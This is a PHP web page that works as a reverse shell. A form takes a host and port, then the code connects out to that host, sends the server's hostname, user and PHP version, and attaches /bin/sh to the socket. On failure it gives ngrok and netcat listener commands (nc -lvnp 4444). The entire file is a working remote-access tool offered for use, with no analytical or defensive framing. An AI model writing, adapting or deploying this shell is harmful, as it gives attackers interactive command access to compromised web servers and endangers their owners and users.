<?php
// ============================================
// Simple Reverse Shell with Retry
// ============================================

$host = isset($_POST['host']) ? $_POST['host'] : '';
$port = isset($_POST['port']) ? (int)$_POST['port'] : 0;

if ($_SERVER['REQUEST_METHOD'] == 'POST' && $host && $port) {
    

    $connected = false;
    for ($attempt = 1; $attempt <= 5; $attempt++) {
        $sock = @fsockopen($host, $port, $errno, $errstr, 5);
        if ($sock) {
            $connected = true;
            break;
        }
        sleep(2);
    }
    
    if ($connected) {

        fwrite($sock, "\n[+] Connected! Hostname: " . gethostname() . "\n");
        fwrite($sock, "[+] User: " . exec('whoami') . "\n");
        fwrite($sock, "[+] PHP Version: " . phpversion() . "\n\n");
        
 
        $descriptorspec = [0 => $sock, 1 => $sock, 2 => $sock];
        $process = proc_open('/bin/sh', $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            proc_close($process);
        }
        
        fclose($sock);
        echo "<h2 style='color:green'>✅ Connected! Check your listener.</h2>";
    } else {
        echo "<h2 style='color:red'>❌ Connection failed after 5 attempts</h2>";
        echo "<p>Error: $errstr ($errno)</p>";
        echo "<p>Make sure:<br>
        - ngrok is running: <code>ngrok tcp 4444</code><br>
        - netcat is listening: <code>nc -lvnp 4444</code><br>
        - Host/Port are correct</p>";
    }
    echo "<a href=''>← Try Again</a>";
    
} else {
  
    echo '
    <form method="POST">
        <h2>Simple Reverse Shell</h2>
        <input type="text" name="host" placeholder="Ngrok Host (tcp.eu.ngrok.io)" required>
        <input type="number" name="port" placeholder="Port" required>
        <button type="submit">Connect</button>
    </form>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 50px; }
        input, button { display: block; width: 300px; padding: 10px; margin: 10px 0; background: #222; color: #0f0; border: 1px solid #0f0; }
        button { background: #0f0; color: #000; cursor: pointer; }
    </style>';
}
?>
